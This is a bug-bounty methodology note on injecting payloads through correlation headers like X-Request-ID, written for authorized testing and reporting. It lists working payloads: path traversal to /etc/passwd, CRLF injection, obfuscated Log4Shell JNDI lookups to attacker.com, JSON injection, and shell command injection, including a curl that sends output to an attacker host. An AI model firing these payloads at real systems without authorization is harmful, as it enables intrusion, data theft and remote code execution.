---
title: "X-Correlation Injection (Header Injection in Correlation IDs)"
type: technique
tags: [web, injection, header-injection, rce, log-injection, api]
date_created: 2026-08-17
date_updated: 2026-08-17
sources: []
related: ["[[command-injection]]"]
status: active
---

# X-Correlation Injection (Header Injection in Correlation IDs)

## Overview

Correlation headers (`X-Request-ID`, `X-Correlation-ID`, `X-Trace-ID`) track requests for debugging and logging. Because they are frequently passed on to logging systems, CI/CD, and backends without validation, they expand the attack surface with multiple injection vectors.

## Impact

- **Path Traversal** (if passed to a filesystem)
- **Header Injection** (CRLF, HTTP splitting)
- **OS Command Injection** (if used in CI/CD scripts)
- **Log4Shell** (if logged by Java applications using Log4j)
- **JSON Injection** (if serialized into a log JSON)
- **RCE** in integration pipelines

## Where to look

```
X-Request-ID
X-Correlation-ID
X-Trace-ID
X-B3-TraceId
traceparent
X-Amzn-Trace-Id
X-Cloud-Trace-Context
```

These headers show up in:
- REST and GraphQL APIs
- Systems with Elastic APM, Zipkin, Jaeger
- Java apps with Log4j
- CI/CD pipelines
- Ticketing/support systems

## Testing methodology

### 1. Identify reflection

```http
GET /api/v1/resource HTTP/1.1
Host: target.com
X-Request-ID: TEST-VALUE-12345

# If the value appears in the response -> injection point
```

### 2. Path traversal

```
X-Request-ID: ../../../etc/passwd
X-Request-ID: ..%2F..%2F..%2Fetc%2Fpasswd
```

### 3. Header injection (CRLF)

```
X-Request-ID: id\r\nInjected-Header: malicious
X-Request-ID: id%0d%0aSet-Cookie: admin=true
```

### 4. Log4Shell

```
X-Request-ID: ${jndi:ldap://attacker.com/x}
X-Request-ID: ${${lower:j}ndi:ldap://attacker.com/x}
X-Request-ID: ${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.com/x}
```

### 5. JSON injection (when logged as JSON)

```
X-Request-ID: id","malicious_key":"injected_value
X-Request-ID: id\","admin\":true,\"x\":\"
X-Request-ID: id"
X-Request-ID: id\"
X-Request-ID: id\
```

### 6. OS command injection (in CI/CD pipelines)

```
X-Request-ID: $(whoami)
X-Request-ID: `id`
X-Request-ID: id;curl attacker.com/$(id)
```

### 7. OOB detection (blind)

```
X-Request-ID: ${jndi:dns://COLLABORATOR/x}
X-Request-ID: $(curl http://COLLABORATOR)
```

## Detection tips

- **Reflection in the response** = strong indicator
- **False positives**: UUID validation (e.g. `[0-9a-f-]{36}`) or per-endpoint restriction
- **Blind**: use an OOB/Collaborator host for detection
- **JSON injection**: probe with context breaks: `"`, `\"`, `\`
- End payloads with `"`, `\"`, or `\` to detect differential parsing

## Tools

```bash
# Burp Suite / Caido - fuzz the correlation headers
# Add X-Request-ID as a payload position

# ffuf
ffuf -u https://target.com/api/endpoint \
  -H "X-Correlation-ID: FUZZ" \
  -w payloads/correlation-injection.txt

# OOB/Collaborator host for blind detection
```

## Reporting tips

- Demonstrate the full data flow (input -> log -> affected system)
- For Log4Shell: show the DNS callback on the Collaborator
- For RCE: PoC with a simple command execution (e.g. `id`)
- Severity varies: Info (simple reflection) -> Critical (RCE via Log4Shell)

## References

- Critical Thinking Podcast: X-Correlation / RCE research drop
